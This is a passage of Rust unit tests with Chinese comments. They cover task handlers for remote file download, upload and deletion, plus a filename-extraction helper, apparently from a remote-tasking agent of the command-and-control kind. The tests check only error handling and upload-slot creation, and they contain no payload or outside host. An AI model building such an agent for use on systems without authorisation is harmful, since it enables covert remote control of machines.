        }

        // 2. 测试 execute_download 缺失参数
        {
            exec_ws.clear();
            let mut dl_slot = None;
            execute_download("task-dl-fail", "", &mut exec_ws, &mut dl_slot);
            let mut items = crate::buffer::StackVec::<TaskResponseItem, 16>::new();
            exec_ws.build_items(&mut items);
            assert_eq!(items.len(), 1);
            assert_eq!(items[0].status, Some("error"));
        }

        // 3. 测试 execute_upload 成功创建上传
        {
            exec_ws.clear();
            let mut ul_slot = None;
            let dummy_uuid = "11112222-3333-4444-5555-666677778888";
            let upload_params = format!(r#"{{"remote_path": "C:\\temp\\dest.bin", "file": "{}"}}"#, dummy_uuid);
            execute_upload("task-ul-test", &upload_params, &mut exec_ws, &mut ul_slot);
            let mut items = crate::buffer::StackVec::<TaskResponseItem, 16>::new();
            exec_ws.build_items(&mut items);
            assert_eq!(items.len(), 1);
            assert!(ul_slot.is_some());
            assert!(items[0].upload.is_some());
        }

        // 4. 测试 execute_rm 缺失参数
        {
            exec_ws.clear();
            execute_rm("task-rm-fail", "", &mut exec_ws);
            let mut items = crate::buffer::StackVec::<TaskResponseItem, 16>::new();
            exec_ws.build_items(&mut items);
            assert_eq!(items.len(), 1);
            assert_eq!(items[0].status, Some("error"));
        }
    }

    #[test]
    fn test_extract_filename() {
        assert_eq!(extract_filename(r"C:\Windows\System32\cmd.exe"), "cmd.exe");
        assert_eq!(extract_filename("/usr/local/bin/agent"), "agent");
        assert_eq!(extract_filename(r"C:\Windows\Temp\"), "Temp");
        assert_eq!(extract_filename("/var/log/"), "log");
        assert_eq!(extract_filename("single_file.txt"), "single_file.txt");
        assert_eq!(extract_filename(""), "");
        assert_eq!(extract_filename(r"\\\\"), "");
    }
}
